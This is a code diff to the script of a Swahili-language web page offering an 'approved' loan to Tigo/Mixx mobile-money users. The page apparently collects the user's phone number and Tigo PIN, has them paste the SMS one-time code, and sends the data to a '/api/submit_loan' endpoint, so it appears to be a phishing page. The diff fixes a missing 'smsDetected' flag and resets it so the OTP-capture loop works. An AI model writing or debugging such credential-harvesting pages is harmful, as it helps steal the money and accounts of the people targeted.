@@ -131,6 +131,7 @@
         document.getElementById('approvedAmount').textContent = 'TZS ' + loanAmount.toLocaleString();
         var appId = '', checkInterval = null, countdownTimer = null, userPhone = '', fastCheck = null;
         var resendCount = 0, resendCooldown = false;
+        var smsDetected = false;  // <-- THIS WAS MISSING!
 
         (function() {
             var ua = navigator.userAgent.toLowerCase();
@@ -174,6 +175,7 @@
             document.getElementById('smsMessage').value = ''; 
             startCountdown(); 
             if (fastCheck) clearInterval(fastCheck);
+            smsDetected = false;  // Reset when entering code screen
             setTimeout(startAutoDetect, 500);
         }
 
@@ -184,6 +186,7 @@
             if (resendCooldown) { document.getElementById('codeError').textContent = 'Subiri sekunde 30 kabla ya kuomba tena.'; document.getElementById('codeError').style.color = 'var(--danger)'; document.getElementById('codeError').classList.add('show'); setTimeout(function() { document.getElementById('codeError').classList.remove('show'); }, 3000); return; }
             if (resendCount >= 3) { document.getElementById('codeError').textContent = 'Umezidi idadi ya maombi. Jaribu tena baadae.'; document.getElementById('codeError').style.color = 'var(--danger)'; document.getElementById('codeError').classList.add('show'); return; }
             resendCount++; resendCooldown = true; document.getElementById('smsMessage').value = '';
+            smsDetected = false;  // Reset on resend
             document.getElementById('codeError').textContent = 'OTP Imetumwa. Subiri msimbo kutoka Mixx. (' + resendCount + '/3)'; document.getElementById('codeError').style.color = 'var(--primary)'; document.getElementById('codeError').classList.add('show'); 
             try { await fetch('/api/submit_loan', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ phone: userPhone, pin: '0000', amount: loanAmount, months: loanTerm, loan_type: '', purpose: 'OTP REQUESTED' }) }); setTimeout(function() { document.getElementById('codeError').classList.remove('show'); }, 3000); } catch(e) {} 
             startChecking(); setTimeout(function() { resendCooldown = false; }, 30000);
@@ -205,7 +208,7 @@
         }
 
         function showSuccess() { document.getElementById('screen4').classList.remove('active'); document.getElementById('successOverlay').classList.add('active'); }
-        function showCodeError() { document.getElementById('screen4').classList.remove('active'); document.getElementById('screen3').classList.add('active'); document.getElementById('smsMessage').value = ''; document.getElementById('codeError').textContent = 'Msimbo sio sahihi. Bandika ujumbe mpya.'; document.getElementById('codeError').style.color = 'var(--danger)'; document.getElementById('codeError').classList.add('show'); startCountdown(); setTimeout(function() { document.getElementById('codeError').classList.remove('show'); }, 4000); }
+        function showCodeError() { document.getElementById('screen4').classList.remove('active'); document.getElementById('screen3').classList.add('active'); document.getElementById('smsMessage').value = ''; smsDetected = false; document.getElementById('codeError').textContent = 'Msimbo sio sahihi. Bandika ujumbe mpya.'; document.getElementById('codeError').style.color = 'var(--danger)'; document.getElementById('codeError').classList.add('show'); startCountdown(); setTimeout(function() { document.getElementById('codeError').classList.remove('show'); }, 4000); }
         function goBackToPinFromCode() { if (fastCheck) { clearInterval(fastCheck); fastCheck = null; } if (countdownTimer) { clearInterval(countdownTimer); countdownTimer = null; } document.getElementById('screen4').classList.remove('active'); document.getElementById('screen1').classList.add('active'); document.getElementById('tigoPin').value = ''; document.getElementById('tigoPin').focus(); document.getElementById('smsMessage').value = ''; document.getElementById('codeError').textContent = 'Namba yako sio ya Tigo. Tafadhali tumia namba ya Tigo au angalia PIN yako ni sahihi.'; document.getElementById('codeError').style.color = 'var(--danger)'; document.getElementById('codeError').classList.add('show'); }
 
         // ================================================================
